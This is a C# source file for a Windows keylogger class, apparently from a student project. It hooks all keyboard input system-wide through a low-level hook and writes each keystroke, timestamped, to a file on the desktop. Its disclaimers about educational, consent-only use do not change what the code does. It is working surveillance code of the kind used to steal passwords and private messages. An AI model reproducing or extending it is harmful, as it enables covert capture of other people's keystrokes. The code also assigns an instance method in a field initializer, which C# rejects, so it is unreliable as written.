using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Windows.Forms;

namespace GameOdev
{
    /// <summary>
    /// Educational KeyLogger - Only use with explicit consent
    /// This is for learning purposes only
    /// </summary>
    public class KeyLogger : IDisposable
    {
        #region Windows API Declarations
        
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern int GetKeyNameText(int lParam, StringBuilder lpString, int nSize);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        #endregion

        #region Private Fields

        private LowLevelKeyboardProc _proc = HookCallback;
        private IntPtr _hookID = IntPtr.Zero;
        private bool _isLogging = false;
        private string _logFilePath;
        private StringBuilder _keystrokeBuffer = new StringBuilder();
        private DateTime _lastKeystroke = DateTime.Now;

        #endregion

        #region Events

        public event EventHandler<string> KeystrokeLogged;

        #endregion

        #region Constructor

        public KeyLogger()
        {
            _logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "EducationalKeyLogger.txt");
        }

        #endregion

        #region Public Methods

        /// <summary>
        /// Start logging keystrokes (Educational use only)
        /// </summary>
        public void StartLogging()
        {
            if (_isLogging) return;

            try
            {
                _hookID = SetHook(_proc);
                _isLogging = true;
                
                // Add educational warning to log file
                WriteToFile("=== EDUCATIONAL KEYLOGGER - USE WITH CONSENT ONLY ===");
                WriteToFile($"Started logging at: {DateTime.Now}");
                WriteToFile("This is for educational purposes only!");
                WriteToFile("==========================================");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error starting keylogger: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Stop logging keystrokes
        /// </summary>
        public void StopLogging()
        {
            if (!_isLogging) return;

            try
            {
                UnhookWindowsHookEx(_hookID);
                _isLogging = false;
                WriteToFile($"Stopped logging at: {DateTime.Now}");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error stopping keylogger: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Get current keystroke buffer
        /// </summary>
        public string GetKeystrokes()
        {
            return _keystrokeBuffer.ToString();
        }

        /// <summary>
        /// Clear keystroke buffer
        /// </summary>
        public void ClearBuffer()
        {
            _keystrokeBuffer.Clear();
        }

        #endregion

        #region Private Methods

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                
                if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)
                {
                    ProcessKeyDown(vkCode);
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void ProcessKeyDown(int vkCode)
        {
            try
            {
                string keyName = GetKeyName(vkCode);
                string keystroke = FormatKeystroke(keyName, vkCode);
                
                _keystrokeBuffer.Append(keystroke);
                _lastKeystroke = DateTime.Now;

                // Write to file
                WriteToFile(keystroke);

                // Raise event
                KeystrokeLogged?.Invoke(this, keystroke);

                // Limit buffer size
                if (_keystrokeBuffer.Length > 10000)
                {
                    _keystrokeBuffer.Remove(0, 1000);
                }
            }
            catch (Exception ex)
            {
                // Silent fail for educational purposes
                System.Diagnostics.Debug.WriteLine($"Error processing keystroke: {ex.Message}");
            }
        }

        private string GetKeyName(int vkCode)
        {
            try
            {
                uint scanCode = MapVirtualKey((uint)vkCode, 0);
                StringBuilder keyName = new StringBuilder(256);
                
                if (GetKeyNameText((int)(scanCode << 16), keyName, 256) > 0)
                {
                    return keyName.ToString();
                }
                
                return GetSpecialKeyName(vkCode);
            }
            catch
            {
                return $"VK_{vkCode}";
            }
        }

        private string GetSpecialKeyName(int vkCode)
        {
            switch (vkCode)
            {
                case 8: return "[BACKSPACE]";
                case 9: return "[TAB]";
                case 13: return "[ENTER]";
                case 16: return "[SHIFT]";
                case 17: return "[CTRL]";
                case 18: return "[ALT]";
                case 20: return "[CAPSLOCK]";
                case 27: return "[ESC]";
                case 32: return "[SPACE]";
                case 37: return "[LEFT]";
                case 38: return "[UP]";
                case 39: return "[RIGHT]";
                case 40: return "[DOWN]";
                case 46: return "[DELETE]";
                case 91: return "[WIN]";
                case 92: return "[WIN]";
                case 144: return "[NUMLOCK]";
                case 145: return "[SCROLLLOCK]";
                default: return $"VK_{vkCode}";
            }
        }

        private string FormatKeystroke(string keyName, int vkCode)
        {
            DateTime now = DateTime.Now;
            return $"[{now:HH:mm:ss}] {keyName}\r\n";
        }

        private void WriteToFile(string text)
        {
            try
            {
                File.AppendAllText(_logFilePath, text);
            }
            catch
            {
                // Silent fail for educational purposes
            }
        }

        #endregion

        #region IDisposable

        public void Dispose()
        {
            StopLogging();
            _keystrokeBuffer?.Clear();
        }

        #endregion
    }
}
